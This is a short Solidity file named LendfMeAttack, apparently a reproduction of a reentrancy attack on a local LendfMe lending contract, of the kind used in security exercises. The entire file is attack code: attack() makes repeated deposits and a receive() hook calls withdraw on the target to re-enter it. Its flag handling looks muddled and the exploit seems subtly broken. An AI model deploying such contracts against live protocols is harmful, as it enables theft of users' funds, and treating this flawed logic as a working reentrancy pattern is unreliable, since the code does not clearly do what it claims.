// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.28;

import "./LendfMe.sol";

contract LendfMeAttack {
    LendfMe public target;
    bool public attacked;

    constructor(address _targetAddress) {
        target = LendfMe(_targetAddress);
    }

    function attack() public payable {
        attacked = true;
        target.deposit(10 ether);
        attacked = false;
        target.deposit(10 ether);
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            target.withdraw(10 ether);
        }
    }
}
